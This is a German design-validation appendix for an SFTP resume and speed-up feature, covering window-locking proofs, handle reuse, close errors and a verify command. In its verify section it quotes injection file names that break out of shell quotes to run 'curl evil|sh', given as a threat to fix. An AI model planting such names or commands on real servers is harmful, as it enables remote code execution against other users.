# Übertragungen fortsetzen und beschleunigen – Validierung (Stufe 3, bindend)

Spec: `docs/superpowers/specs/2026-10-21-transfer-resume-speed-design.md`, Plan: `docs/superpowers/plans/2026-10-21-transfer-resume-speed.md` (verweist nur auf die Spec). Dieser Anhang geht Spec und Plan vor. N1–N9 und S1–S4 gelten. B1, B2 und K1–K12 der ersten Validierung (`2026-10-21-transfer-resume-validation.md`) gelten weiter, soweit Spec 4.5 oder dieser Anhang sie nicht ersetzen.

**Urteil: ready after corrections.** 7 Blocker, 18 Korrekturen, 11 offene Risiken.

Ausgangslage geprüft: `npm run typecheck` grün, `npx vitest run` 131 Dateien / 1877 Tests grün (Stand `c2bc9b7`). In Stichproben stimmen die Zeilenangaben der Spec: `transfer.ts:64–142`, `file-system.ts:11–28, 55–62`, `sftp-session.ts:42–47, 256–299`, `FilesPanel.tsx:336–379`, `auto-upload.ts:271`, `commands.ts:15–17`, ssh2 1.17.0 `SFTP.js` 422–490 (write), 2101–2165 (read_), 2640–2690 (sendOrBuffer). Die Paketgrenzen ohne OpenSSH-Ident (`SFTP.js:157–162`) betragen `34000 − 2048 = 31 952`.

## Prüfergebnisse zum Schwerpunkt

| Frage | Ergebnis |
|---|---|
| Älteste unbestätigte Anfrage als Sperre | **Korrekt.** `pending` ist eine Map in Einfügereihenfolge mit lauter aufeinanderfolgenden Stücken ab `oldest`. `pending.size < inFlight` vor jedem Ausgeben bedeutet `offset − oldest ≤ W`, egal in welcher Reihenfolge die Bestätigungen kommen. Bestätigte Stücke hinter `oldest` bleiben in der Map, bis `oldest` erledigt ist. Der Beweis in 4.1 (1–5) trägt, auch für mehrere Abbrüche hintereinander. Ich habe ihn für den Mischfall `S_k < S_{k+1} < offset_{k+1}` nachgerechnet: `S_{k+1} − W ≤ offset_{k+1} − W ≤ oldest_{k+1}`. |
| Kurze Reads und Writes | Lokal liest `read` in einer Schleife bis `length` oder 0 Bytes, `write` schreibt in einer Schleife über `bytesWritten`. Liefert `bytesWritten` 0, dreht die Schleife endlos (V-K8). Auf dem Server gibt es für WRITE keinen Teilerfolg. Bei READ fragt die Schleife nach einem kurzen Ergebnis neu, und EOF liefert 0 (`SFTP.js:2147–2165`). Damit kann `data.length < want` nur am Dateiende auftreten. Es gibt keinen Retry je Stück. Ein Fehler beendet die Kopie, die `.part` bleibt, und weiter geht es über „Fortsetzen“. |
| Fehler mitten im Fenster | **Korrekt.** `failure` stoppt das Ausgeben, und die Schleife wartet, bis alle offenen Stücke erledigt sind. Das fehlgeschlagene Stück `f` war offen, als das letzte Stück ausgegeben wurde. Daraus folgt `S ≤ oldest + W ≤ f + W`, die Lücke liegt also in `[S − W, S)`. Hängt dabei ein Stück auf einem stummen Server, wartet die Schleife, bis abgebrochen wird. Das ist hingenommen, der Abbruch wirkt über `race`. |
| Späte Writes nach Abbruch (`Promise.race`) | **Lokal sicher:** Node-`FileHandle.close()` wartet auf laufende Operationen, danach lehnt der Handle mit `EBADF` ab. **Auf dem Server nicht sicher (V-B7):** (a) Ein Stück, dessen lokales Lesen beim Abbruch noch läuft, schickt sein WRITE erst **nach** dem CLOSE. (b) ssh2 zerlegt ein 32-KiB-Stück bei Servern ohne OpenSSH-Ident in 31 952 + 816 Bytes. Den Rest schickt es aus dem Ack-Callback des ersten Teils, also ebenfalls nach dem CLOSE, und ohne dass wir das verhindern könnten. OpenSSH vergibt freie Handle-Nummern sofort neu (`handle_new` mit `first_unused`). Ein OPEN, das in diesem Moment auf **demselben Kanal** läuft (Auto-Upload nutzt `session.fs`, ein anderer Arbeiter, „Bearbeiten“), bekommt deshalb dieselbe Nummer. Das späte WRITE landet dann in einer **fremden Datei**. Fix V-K1 + V-K2. |
| Späte Writes nach „Verwerfen“ | Ein WRITE legt nie eine Datei an, das tut nur OPEN mit CREAT. Jedes OPEN dieses Codes steht direkt hinter `checkAborted`. K7 sperrt „Verwerfen“, solange Jobs aktiv sind. Eine `.part` entsteht also nicht von selbst wieder. Korrekt. |
| Warten auf `close` (R19) | **Kein Fehler im Ablauf, aber eine Regression (V-B5):** Bei einem stummen Server oder einem toten Kanal löst sich `close` nie auf. ssh2 trägt Anfragen nach `cleanupRequests` ein, beantwortet sie aber nie (`tryWritePayload` bei `state !== 'open'`). Dann bleibt der Job auf „läuft“, die Warteschlange steht, und der Idle-Timer schließt nie (`session.running`). Heute kehrt der Abbruch sofort zurück (`pipeline` mit `signal`). |
| Fehler beim `close` im Erfolgsfall | **Blocker V-B2:** `finally { await dest.close().catch(() => {}) }` schluckt CLOSE-Fehler und benennt danach um. Server, die erst beim CLOSE schreiben (S3- oder Netzwerk-Backends, AWS Transfer, Quota beim Flush), erzeugen so still eine unvollständige Zieldatei. Heute schlägt `pipeline` dann fehl. |
| `pwrite`, Positionen, > 4 GB | ssh2 schreibt den Offset als uint64 byteweise per `& 0xFF` und `/= 256`. Das ist bis 2^53 korrekt (`SFTP.js:467–470`, 2127–2130). Größen kommen über `readUInt64BE`. Node `FileHandle.read/write` nimmt `position` als Zahl bis 2^53. Positionsfehler gibt es nicht: Jedes Stück trägt seinen absoluten Offset. |
| Rückspulpunkt | `R = S − W` nur bei `S > W`, der Vergleich liegt in `[R − 1 MiB, R)`, also vollständig im bestätigten Bereich. Eine `.part` ≤ W wird ohne Prüfung mit `'w'` neu geschrieben. Eine `.part` aus 0.17 ist ein lückenloses Präfix: 0.17 löscht die `.part` bei jedem Fehler, sie bleibt nur nach einem Absturz liegen. **R16 ist nicht ausreichend festgehalten:** Spec E7 („TUNING ist die Stelle für Einstellungen“) lädt genau zum Verkleinern ein. Es gibt keinen Test, der das verhindert. Fix V-K16 (Test, der W festnagelt) und Kommentar. |
| Ziel nie vorzeitig ersetzen | Das Umbenennen kommt erst nach `copyRange` und dem (nach V-K3 erfolgreichen) `close`. K3 (Ausweichpfad) und B1/K1 (Ordner `x.part` → `files.existsAsDirectory` vor `partials.add`) stehen in 3.3. Korrekt. |
| Parallele Dateien | **Zwei Blocker:** V-B3 (Konfliktkette nach Abbruch oder Fehler hängt) und V-B4 (zwei Ziele, die sich nur in der Groß-/Kleinschreibung unterscheiden, landen beim Download nach Windows in **einer** `.part`, beide schreiben gleichzeitig). Außerdem: Das Relay wird erst nach der Ordnerphase registriert. Ein Abbruch während des letzten `mkdir` geht damit verloren (V-K5). `running` als `Set` der Namen verliert gleichnamige Dateien aus verschiedenen Ordnern (V-K7). Die Zähler als reine Inkremente sind korrekt, ebenso das Fortsetzen pro Datei. Ordner vor Dateien ist korrekt, Risiko 4 ist hingenommen. |
| `sha256sum` und `shellJoin` | `shellJoin` ist für POSIX-`sh`, `bash`, `dash` und `zsh` sicher, auch bei Leerzeichen, `'`, `-` (hinter `--`), Zeilenumbruch und `$`. **Nicht sicher (V-B6):** `client.exec` läuft durch die **Login-Shell** des Kontos. (a) In **fish** sind `\'` und `\\` auch innerhalb von `'…'` Escapes. Der Name `x\' ; curl evil\|sh #` bricht dort aus den Quotes aus, und der Rest läuft als Befehl. (b) Auf einem **Windows-OpenSSH-Server** mit `cmd.exe` schützen einfache Quotes gar nicht. `&` im Dateinamen führt dann einen zweiten Befehl aus. (c) In csh/tcsh ist `2>/dev/null` keine Umleitung, und ein Zeilenumbruch in `'…'` ist ein Syntaxfehler (keine Injektion). Dateinamen kontrolliert beim Download der Server bzw. andere Nutzer darauf. Das ist ein realer Angriffsweg in geteilten Verzeichnissen. Fix V-K9: `sh -c` mit `"$1"` und eine Positivliste für Namen. |
| Ausgabeparsing | `^…\s` ohne `m` scheitert, sobald `.bashrc` etwas auf stdout ausgibt. Die ersten 4096 Zeichen können den Hash abschneiden, wenn ein Banner länger ist. Fix V-K9: das Ende der Ausgabe behalten und mit `m` suchen. Ein lügender Server kann „stimmt“ melden. Das liegt außerhalb des Zwecks: „Prüfen“ belegt die Übertragung, nicht die Ehrlichkeit des Servers (Risiko 7). |
| Vertrauensgrenze `sftp:verify` | Die Prüfung ist korrekt. IPC trägt nur `{ sessionId, jobId }` (`JobSchema`), `owned()` prüft den Besitzer, und die Pfade stammen ausschließlich aus `entry.copied` (Main-Zustand). Der Befehl läuft nur nach einem Klick. Es gibt keinen Weg vom Renderer zur Shell. Die kubeconfig ist nicht berührt: Der `exec`-Kanal liest nichts aus `kubernetes/`. |
| Kanalfenster | Es ist eine **harte Grenze**. Eingehend legt ssh2 `MAX_WINDOW` = 2 MiB fest (`Channel.js:14–16`) und füllt erst bei ≤ 1 MiB nach. Ausgehend gewährt OpenSSH 2 MiB. Alle Dateien eines Jobs **teilen einen** SFTP-Kanal. Vier Dateien bringen für große Dateien deshalb keinen Durchsatz, sie helfen nur bei vielen kleinen (Open/Stat/Close-RTTs). |
| Speicher, Backpressure | Je Datei liegen 128 Stücke in unseren Puffern und als Kopie in ssh2 (`out`-Puffer, bei Fenster 0 in `_buffer`), also ≤ 2 × W ≈ 7,75 MiB. Bei 4 Dateien sind das ≈ 31 MiB Spitze. Die Fenstersperre ist die einzige Backpressure und genügt. Folge: Bis zu ≈ 14 MiB stehen in ssh2 `_buffer` **vor** jeder anderen Anfrage des Kanals (Listing, Bearbeiten, Auto-Upload). Bei 10 Mbit/s Upload wartet ein Verzeichniswechsel dann bis zu ≈ 12 s (Risiko 2). |
| Auto-Upload | Er ist verträglich: Jedes Item ruft `runTransfer` einzeln auf, Ordner-Items gehen nur durch die Ordnerphase, ohne `keepPartial` wird gelöscht, und `doneBytes += size − counted` entspricht dem alten `before + size`. Der Fake `fakeRemote` ist `as unknown as` gecastet, `openWrite` reicht dort für den Typecheck. |
| Tests | Die Fälle 1–15 tragen. Es fehlen die Umstellung zweier Stream-Tests (`transfer.test.ts:129–143` `slow.read`, `171–178` `from.read` mit `destroy`), Tests für V-B2 bis V-B7 und ein Test für `sftp-file-system` (neue Handles). Der run-app-Testserver muss beim verzögerten WRITE den Handle **im** Timer nachschlagen, sonst schreibt er in einen schon geschlossenen fd. |
| Regeln | Neue Keys de/en mit Namespace, Platzhalter `{{max}}`, `{{names}}`, `{{name}}`. Quote-Stil: de „…“, en “…”. Kein CSS, keine Tokens, keine Bewegung. Die Orphan-Regel (d) ist erst nach Welle 2 erfüllt (B legt an, F nutzt). Das passt, weil beide in Welle 2 liegen. |
| Plan | Die Wellen 0–2 sind dateiexklusiv. **Welle 1 wäre rot (V-B1):** Der Hook in Task A nutzt `VERIFY_MAX`, das laut Spec erst F in Welle 2 anlegt. `fakes.test.mjs` fehlt in D0, obwohl vitest die Datei ausführt. `sftp-file-system.test.ts` fehlt in A. Die Vorher-Messung liegt richtig nach D0 und vor Welle 1. |

## 1. Vertrag (bindend, exakt)

Wo hier nichts steht, gilt die Spec wörtlich. Die Code-Kommentare stehen auf Englisch, die UI-Texte nur über Keys.

### 1.1 `src/main/files/file-system.ts`

Die Schnittstelle (`ReadHandle`, `WriteHandle`, `openRead`, `openWrite`) entspricht Spec 3.1 wörtlich. Bei `WriteHandle` kommt im Doc-Kommentar hinzu: `` `write` after `close` rejects without sending anything. `` Lokale `openWrite`-Schleife:

```ts
        for (let done = 0; done < data.length;) {
          const { bytesWritten } = await handle.write(data, done, data.length - done, position + done);
          // A write that makes no progress would spin forever.
          if (!bytesWritten) throw Object.assign(new Error('short write'), { code: 'EIO' });
          done += bytesWritten;
        }
```

### 1.2 `src/main/files/sftp-file-system.ts`

```ts
    openRead: async path => {
      const handle = await call<Buffer>(callback => sftp.open(path, 'r', callback));
      // Servers hand a closed handle's number to the next open; nothing may be sent on it afterwards.
      let closed = false;
      return { read: async (length, position) => {
          const buffer = Buffer.allocUnsafe(length);
          let got = 0;
          // ssh2 splits requests above the server's limit itself; a short answer short of EOF is asked again.
          while (got < length) {
            if (closed) throw new Error('handle closed');
            const bytes = await call<number>(callback => sftp.read(handle, buffer, got, length - got, position + got, (error, count) => callback(error, count)));
            if (!bytes) break;
            got += bytes;
          }
          return buffer.subarray(0, got);
        }, close: () => { closed = true; return call<void>(callback => sftp.close(handle, error => callback(error, undefined))); } };
    },
    openWrite: async (path, mode = 0o644, resume) => {
      const handle = await call<Buffer>(callback => sftp.open(path, resume ? 'r+' : 'w', mode, callback));
      // Like ssh2's write stream: servers set the mode on new and existing files alike; a refusal is not an error.
      await call<void>(callback => sftp.fchmod(handle, mode, error => callback(error, undefined))).catch(() => {});
      let closed = false;
      return { write: async (data, position) => {
          if (closed) throw new Error('handle closed');
          await call<void>(callback => sftp.write(handle, data, 0, data.length, position, error => callback(error, undefined)));
        }, close: () => { closed = true; return call<void>(callback => sftp.close(handle, error => callback(error, undefined))); } };
    },
```

### 1.3 `src/main/files/transfer.ts`

```ts
/** Copy window: pieces of `chunk` bytes, at most `inFlight` unconfirmed, `files` copied at once per job. Tests change and restore it.
 *  31 KiB stays below ssh2's 31 952-byte limit for servers without OpenSSH ident, so no piece is ever split (a split's tail goes out after a close). */
export const TUNING = { chunk: 31 * 1024, inFlight: 128, files: 4 };
/** Bytes that may be unconfirmed at any time; a leftover .part is resumed this far before its end.
 *  Never lower it below 128 × 31 KiB in a later version or a setting: older .part files may hold gaps that far back (R16). */
export const windowBytes = (): number => TUNING.chunk * TUNING.inFlight;
const TAIL_BYTES = 1024 * 1024;
const CLOSE_WAIT_MS = 10_000;

/** Closing after a cancel or failure: a silent or dead server must not hold the job; the result does not matter there. */
async function settle(closing: Promise<void>): Promise<void> {
  let timer: ReturnType<typeof setTimeout> | undefined;
  await Promise.race([closing.catch(() => {}), new Promise<void>(resolve => { timer = setTimeout(resolve, CLOSE_WAIT_MS); })]);
  clearTimeout(timer);
}
```

`copyRange` wie in Spec 3.2, mit genau diesen Änderungen:
```ts
  let open = true;
  const piece = async (at: number): Promise<void> => {
    const want = Math.min(TUNING.chunk, size - at);
    const data = await source.read(want, at);
    if (data.length < want) eof = true;
    // Pieces that land after a cancel are not reported: the job has already ended.
    if (data.length) { await target.write(data, at); if (open) onConfirmed(data.length); }
  };
  …
  } finally { open = false; signal.removeEventListener('abort', cancel); }
```

`copyFile` ab `const source = …` (Kopf mit B1/K1 bleibt wie in Spec 3.3):
```ts
  const source = await from.openRead(item.source);
  try {
    let offset = 0;
    if (part && part.size > windowBytes()) {
      if (await resumable(source, item, to, partial, part)) { offset = part.size - windowBytes(); job.resumedFrom = (job.resumedFrom ?? 0) + offset; }
      else { await to.removeFile(partial); job.restarted = true; }
    }
    checkAborted(signal);
    partials.add(partial); job.partials = [...partials];
    let counted = offset;
    if (offset) { job.doneBytes += offset; hooks.progress(job); }
    try {
      const dest = await to.openWrite(partial, mode, offset > 0);
      try {
        await copyRange(source, dest, offset, item.size, signal, bytes => { counted += bytes; job.doneBytes += bytes; job.bytesPerSecond = rate.add(bytes); hooks.progress(job); });
      } catch (error) { await settle(dest.close()); throw error; }
      // Some servers commit the data only on close; a failed close is a failed copy.
      await dest.close();
    } catch (error) {
      if (!hooks.keepPartial) { await to.removeFile(partial).catch(() => {}); partials.delete(partial); job.partials = [...partials]; }
      if (signal.aborted) throw new TransferCanceled();
      throw error;
    }
    // Rename swap: K3 of the first validation, verbatim, with `partials.delete(partial); job.partials = [...partials]` wherever it set `job.partial = undefined`.
    …
    partials.delete(partial); job.partials = [...partials];
    // Files that changed size while copying still count once; other files may have counted meanwhile, so add the difference.
    job.doneBytes += item.size - counted;
  } finally { await settle(source.close()); }
```
In `resumable` wird `finally { await ours.close().catch(() => {}); }` zu `finally { await settle(ours.close()); }`.

`runTransfer`: Es gilt Spec 5 mit diesen Ersetzungen. `inner`, `stop` und `stopped` stehen **vor** der Ordnerphase. `relay` und `removeEventListener` entfallen.
```ts
  // One failure or cancel stops every worker; the first error is the job's error.
  const inner = new AbortController();
  const stop = AbortSignal.any([signal, inner.signal]);
  const stopped = new Promise<never>((_, reject) => stop.addEventListener('abort', () => reject(new TransferCanceled()), { once: true }));
  stopped.catch(() => {});
```
- Die Ordnerphase prüft `checkAborted(stop)`.
- `decide`:
```ts
    const turn = asking.then(async () => {
      // Questions still waiting when the job stops are never shown.
      checkAborted(stop);
      if (policy) return policy;
      job.bytesPerSecond = undefined; rate.reset();
      // A failing worker stops the job while a question is open; the answer no longer matters then.
      const answer = await Promise.race([hooks.conflict({ name: item.name, source: { size: item.size, modified: item.modified },
        target: { size: existing.size, modified: existing.modified } }), stopped]);
      if (answer.applyToAll) policy = answer.choice;
      return answer.choice;
    });
```
- `running` wird `const running = new Map<PlannedItem, string>()`. In `one` steht `running.set(item, item.name)` bzw. `running.delete(item)`, dazu `job.current = [...running.values()].join(', ') || undefined`.
- In `one` werden `checkAborted(inner.signal)` und `copyFile(…, inner.signal)` zu `stop`.
- Breite:
```ts
  const files = items.filter(item => item.type === 'file');
  // Windows ignores case: two names for one target are copied one after another, like before.
  const width = new Set(files.map(item => item.target.toLowerCase())).size === files.length ? TUNING.files : 1;
  await mapLimit(files, width, async item => { if (failure !== undefined) return; try { await one(item); } catch (error) { failure ??= error; inner.abort(); } });
```
`TransferHooks`: `keepPartial?: boolean` (wie validiert), `copied?: (source: string, target: string) => void`. Die Signatur von `conflict` bleibt unverändert.

### 1.4 `src/main/files/sftp-session.ts` (Welle 1, Task A)

- `export const VERIFY_MAX = 10_000;` legt A an (vor `PROGRESS_INTERVAL`). F nutzt die Konstante und legt sie **nicht** erneut an.
- `Job.copied: { source: string; target: string }[]`, Job-Literal `copied: []` und `sources: [...request.sources]`. Hooks wie Spec 7.2.
- Im `finally` von `pump`, vor `emitJob`:
```ts
      // A question of a stopped job must not come back with `state`.
      if (session.conflict?.conflict.jobId === job.id) session.conflict = undefined;
      if (!job.resumedFrom) entry.copied = [];
```

### 1.5 `src/shared/sftp.ts`, `src/shared/ipc.ts`, `src/preload/index.ts`

- `TransferJob`: Felder wie Spec 7.1, wörtlich.
- `IPC_CHANNELS.sftpVerify: 'sftp:verify'` steht nach `sftpResolve`.
- `DesktopApi.sftpVerify: (request: SftpJobRequest) => Promise<void>;`
- Preload: `sftpVerify: request => ipcRenderer.invoke('sftp:verify', request),`

### 1.6 `src/main/files/verify.ts` (Welle 2, Task F)

```ts
import { posix } from 'node:path';
import { shellJoin } from '../containers/commands';
const SCRIPT = 'sha256sum -- "$1" 2>/dev/null || shasum -a 256 -- "$1"';
// Only names every common login shell (sh, bash, zsh, fish, csh, cmd, PowerShell) passes literally inside '…'.
const VERIFIABLE = /^[\p{L}\p{N}\p{M} _.\/+,=@~#:()[\]'-]+$/u;
/** Runs in sh whatever the login shell is; the path is the only argument. */
export const verifyCommand = (path: string): string => shellJoin(['sh', '-c', SCRIPT, 'sh', path]);
```
- `sha256Remote(client, path)`: Passt `path` nicht zu `VERIFIABLE`, folgt `reject(new FileError('files.verifyUnsafeName', { name: posix.basename(path) }))` **ohne** `exec`. Sonst `client.exec(verifyCommand(path), …)`. Zur Ausgabe: `out = (out + chunk.toString('utf8')).slice(-4096)`, Treffer über `/^([0-9a-f]{64})[ \t]/im`, Ergebnis kleingeschrieben. Kein Treffer, ein `exec`-Fehler oder ein Stream-`error` führen zu `files.verifyUnavailable`. `stream.stderr.resume()` bleibt.
- Beispiel, das wörtlich gilt (Test): `verifyCommand("/srv/it's here.bin")` ergibt
  `sh -c 'sha256sum -- "$1" 2>/dev/null || shasum -a 256 -- "$1"' sh '/srv/it'\''s here.bin'`
- `sha256Local` und `verifyCopies` wie Spec 6. `session.verify` wie Spec 6, nutzt `VERIFY_MAX` aus 1.4.
- `src/main/files/ipc.ts`: `handle(IPC_CHANNELS.sftpVerify, JobSchema, (ownerId, request) => manager.verify(ownerId, request.sessionId, request.jobId));`

### 1.7 Texte (wörtlich, ergänzend zu Spec 7.4 und K12)

`errors/files.json` → `files`, zusätzlich zu `connectionLost`, `verifyUnavailable` und `verifyTooMany`:

| Key | de-DE | en-US |
|---|---|---|
| `verifyUnsafeName` | „{{name}}“ lässt sich nicht prüfen: Der Name enthält Zeichen, die nicht sicher an den Server übergeben werden können. | “{{name}}” cannot be verified: its name contains characters that cannot be passed to the server safely. |

Die Handbuch-Sätze aus Spec 7.4 lauten wegen V-K1 so:
- „Fortgesetzt wird knapp vier Megabyte vor dem Ende der Teildatei, weil bis dahin noch Daten unterwegs gewesen sein können; das letzte Megabyte davor wird mit der Quelle verglichen.“ (en: „Shellherd resumes just under four megabytes before the end of the partial file, because data up to that point may still have been in flight; the megabyte before it is compared with the source.“)
- „Shellherd hält dabei knapp vier Megabyte an Anfragen gleichzeitig unterwegs und kopiert bei Ordnern bis zu vier Dateien parallel; die Zeile nennt die gerade laufenden Dateien.“ (en: „Shellherd keeps just under four megabytes of requests in flight and copies up to four files of a folder in parallel; the row names the files currently running.“)
- An den Prüfen-Satz wird angehängt: „Dateinamen mit Zeichen wie &, $ oder \ lassen sich nicht prüfen.“ (en: „File names with characters such as &, $ or \ cannot be verified.“)

## 2. Blocker

- **V-B1 – Welle 1 ist rot, weil `VERIFY_MAX` fehlt** (Spec 7.2: Task A nutzt `VERIFY_MAX` im Hook, Spec 10 legt die Konstante erst in F an).
  - Fehlerszenario: Der Typecheck nach Welle 1 meldet `Cannot find name 'VERIFY_MAX'`.
  - Fix: Vertrag 1.4, A legt die Konstante an.
- **V-B2 – Ein fehlgeschlagenes CLOSE wird als Erfolg umbenannt** (Spec 3.3 `finally { await dest.close().catch(() => {}) }`).
  - Fehlerszenario: Ein SFTP-Server mit Objekt-Backend meldet den Fehler erst beim CLOSE (Quota, Upload-Abbruch). Shellherd ersetzt das alte Ziel durch die unvollständige `.part` und meldet „Fertig“.
  - Fix: V-K3.
- **V-B3 – Parallele Konfliktfragen hängen den Job auf** (Spec 5 `decide`).
  - (a) Der Nutzer bricht in der ersten Frage ab, oder ein anderer Arbeiter scheitert. Die schon wartenden `turn`s fragen trotzdem, `ask` öffnet einen neuen Dialog für einen abgebrochenen Job, und `mapLimit` wartet auf dessen Antwort.
  - (b) Ein Arbeiter scheitert (ENOSPC), während eine Frage offen ist. `inner.abort()` löst `hooks.conflict` nicht auf. Der Arbeiter hängt für immer, der Job bleibt auf „läuft“, und die Warteschlange steht.
  - Fix: V-K5, V-K6.
- **V-B4 – Zwei Dateien, eine `.part`** (Spec 5, `mapLimit` ohne Rücksicht auf Groß-/Kleinschreibung).
  - Fehlerszenario: Ein Ordner auf dem Server enthält `Readme.md` und `README.md`. Beim Download nach Windows sehen beide Arbeiter kein Ziel und schreiben gleichzeitig in `readme.md.part` (`'w'`, positioniert). Das Ergebnis ist ein still gemischter Inhalt. Seriell kam heute für die zweite Datei die Konfliktfrage.
  - Fix: V-K7.
- **V-B5 – Der Abbruch hängt an `close`** (Spec 3.3/4.3, R19).
  - Fehlerszenario: Der Server antwortet nicht mehr, oder der Kanal ist tot. ssh2 beantwortet ein CLOSE nach `cleanupRequests` nie. Der Job bleibt nach dem Klick auf „Abbrechen“ auf „läuft“, folgende Jobs starten nicht, und der Idle-Timer schließt die Sitzung nie. Das ist eine Regression gegenüber heute.
  - Fix: V-K3 (`settle`, 10 s). Die Korrektheit hängt dann nicht mehr am Warten, sondern an V-K1/V-K2: Auf demselben Kanal kommen keine späten Anfragen mehr, und OpenSSH arbeitet der Reihe nach ab.
- **V-B6 – Befehlsinjektion über den Dateinamen bei „Prüfen“** (Spec 6 `command`).
  - Fehlerszenario: Ein anderer Nutzer legt auf einem geteilten Server `x\'\'' ; curl evil|sh #` ab. Der Nutzer lädt den Ordner herunter, bricht ab, setzt fort und klickt „Prüfen“. Ist seine Login-Shell fish, läuft `curl evil|sh` mit seinen Rechten. Auf einem Windows-OpenSSH-Server mit `cmd.exe` genügt ein `&` im Namen.
  - Fix: V-K9.
- **V-B7 – Späte WRITEs landen in fremden Dateien** (Spec 3.1/3.2, 32-KiB-Stücke, Handles ohne Sperre nach `close`).
  - Fehlerszenario: Das Ziel ist ein Server ohne OpenSSH-Ident (ProFTPD, Bitvise, AWS Transfer). Der Nutzer bricht einen Upload ab, und gleichzeitig öffnet der Auto-Upload derselben Sitzung eine Datei. Diese bekommt die eben freigewordene Handle-Nummer. Die 816-Byte-Reste der zerlegten Stücke und die WRITEs gerade fertig gelesener Stücke gehen nach dem CLOSE raus und landen im Auto-Upload-Ziel. Ist es kürzer, wird es mit Nullen und fremden Bytes verlängert und still beschädigt.
  - Fix: V-K1 (Stück 31 KiB, nie zerlegt), V-K2 (Handle-Sperre).

## 3. Korrekturen (bindend)

| # | Datei | Korrektur |
|---|---|---|
| V-K1 | `src/main/files/transfer.ts` | `TUNING.chunk = 31 * 1024`, W = 128 × 31 KiB = 4 063 232 Bytes, Kommentare wörtlich wie in 1.3. Ruling V1: N7 nennt „etwa 4 MB“, und 3,875 MiB erfüllt das. Mit 32 KiB würde ssh2 auf Fremdservern jedes Stück zerlegen, und der Rest ginge unkontrollierbar nach einem CLOSE raus (V-B7). Das Kanalfenster deckelt ohnehin, der Durchsatz ändert sich nicht. Behebt V-B7 mit V-K2. |
| V-K2 | `src/main/files/sftp-file-system.ts` | Handle-Sperre `closed` in `openRead` und `openWrite`, wörtlich wie in 1.2. `write` prüft die Sperre synchron, bevor irgendetwas gesendet wird. `read` prüft sie vor jeder Teilanfrage. |
| V-K3 | `src/main/files/transfer.ts` | `settle` und `CLOSE_WAIT_MS = 10_000` wie in 1.3. Im Erfolgsfall wird `await dest.close()` **ohne** `catch` vor dem Umbenennen aufgerufen. Bei Fehler oder Abbruch wird `dest` mit `settle` geschlossen, die Quelle und die `.part` in `resumable` immer über `settle`. Behebt V-B2 und V-B5. R19 wird zu: „Nach einem Abbruch schließt `copyFile` beide Handles und wartet darauf höchstens 10 s; späte Anfragen verhindern V-K1 und V-K2.“ |
| V-K4 | `src/main/files/transfer.ts` | `copyRange` setzt die Sperre `open = false` im `finally`. Späte Bestätigungen melden kein `onConfirmed` mehr, sonst stünde an einer abgebrochenen Zeile eine Rate. |
| V-K5 | `src/main/files/transfer.ts` | `stop = AbortSignal.any([signal, inner.signal])` vor der Ordnerphase und `stopped` als Promise. `decide` prüft `checkAborted(stop)` und läuft per `race` gegen `stopped` (1.3). Arbeiter und `copyFile` nutzen `stop`. Behebt V-B3 und den verlorenen Abbruch beim letzten `mkdir`. |
| V-K6 | `src/main/files/sftp-session.ts` | `pump` räumt im `finally` den Konflikt-Slot des eigenen Jobs (1.4). Sonst liefert `state()` nach dem Wechsel des Fensters einen Dialog zu einem toten Job. |
| V-K7 | `src/main/files/transfer.ts` | `width` = 1, sobald zwei Datei-Ziele des Jobs bis auf Groß-/Kleinschreibung gleich sind (1.3). `running` als `Map<PlannedItem, string>`. Behebt V-B4. |
| V-K8 | `src/main/files/file-system.ts` | Lokale Write-Schleife mit Abbruch bei `bytesWritten === 0` (1.1). |
| V-K9 | `src/main/files/verify.ts` | `verifyCommand` über `sh -c` mit `"$1"`, Positivliste `VERIFIABLE`. Namen außerhalb der Liste erzeugen `files.verifyUnsafeName` **ohne** `exec`. Die Ausgabe wird vom Ende gelesen (4096 Zeichen), der Hash mit `/^([0-9a-f]{64})[ \t]/im` gesucht (1.6). Behebt V-B6. |
| V-K10 | `.claude/skills/run-app/sshd.mjs` | Zu `execReply`: Muster `/^sh -c 'sha256sum -- "\$1" 2>\/dev\/null \|\| shasum -a 256 -- "\$1"' sh ('(?:[^']\|'\\'')*'\|[A-Za-z0-9_.\/:=@%+,-]+)$/`. Ein gequotetes Wort wird mit `.slice(1, -1).replaceAll("'\\''", "'")` entquotet, danach folgt `local()`. `local` zieht dafür aus `sftpHandler` auf Modulebene, mit `root` als Parameter. Antwort `${hex}  ${p}\n`, Code 0. Fehlt die Datei: `{ err: 'sha256sum: …: No such file or directory\n', code: 1 }`. Zur Latenz: `later` umschließt READ, WRITE **und** CLOSE, damit die Reihenfolge wie bei OpenSSH erhalten bleibt. `lookup(buffer)` steht **im** verzögerten Lauf. Kopfkommentar wie in Spec 7.5. |
| V-K11 | `src/main/files/transfer.test.ts` | Zusätzlich zu Spec 8.1: (a) `memory().openWrite(…).close` löst sofort auf, auch wenn `stallFrom` Writes offen lässt. (b) Der Test `129–143` (`slow.read`) wird auf `openRead` umgestellt: Das erste Stück liefert Daten, die weiteren hängen, nach 5 ms folgt `abort`. Danach gibt es kein Ziel und keine `.part`, und `job.partials` ist leer. (c) Der Test `171–178` wird auf `openRead` umgestellt: Das zweite `read` wirft `read`, das Ziel behält `'old'`, und es bleibt keine `.part`. (d) Neu 16: CLOSE schlägt im Erfolgsfall fehl (`openWrite(...).close` wirft `boom`). Erwartet `rejects.toThrow('boom')`, `/target/a.txt` behält `'old'`. (e) Neu 17: Das Write bei Offset 0 bleibt offen, die Kopie wird abgebrochen, danach löst das Write auf. Nach der Ablehnung von `transfer` folgt kein weiterer `progress`-Aufruf. (f) Neu 18: `TUNING.files = 4`, drei Dateien, zwei davon mit vorhandenem Ziel. Die erste Frage bleibt offen, die dritte Datei scheitert beim Lesen. `transfer` lehnt mit dem Lesefehler ab, und `conflict` wurde genau einmal aufgerufen. (g) Neu 19: Ziele `/target/A.txt` und `/target/a.txt`, `openWrite` zählt gleichzeitig offene Handles: nie mehr als 1. (h) Neu 20 (V-K16). Fall 7 mit `TUNING = { chunk: 4, inFlight: 4, files: 4 }`. |
| V-K12 | `src/main/files/sftp-file-system.test.ts` | Bestehender Test bleibt. Neu: Fake-`SFTPWrapper` mit `open`, `fchmod`, `read`, `write` und `close`. (a) `openWrite('/x', 0o600, true)` ruft `open` mit `'r+'` und `0o600` auf, `false` mit `'w'`. (b) Ein `fchmod`-Fehler wird ignoriert. (c) Nach `close()` lehnt `write` ab, ohne `sftp.write` aufzurufen. (d) `read` fragt nach einer kurzen Antwort (10 von 16 Bytes) den Rest ab Position + 10 neu an und hört bei 0 auf. |
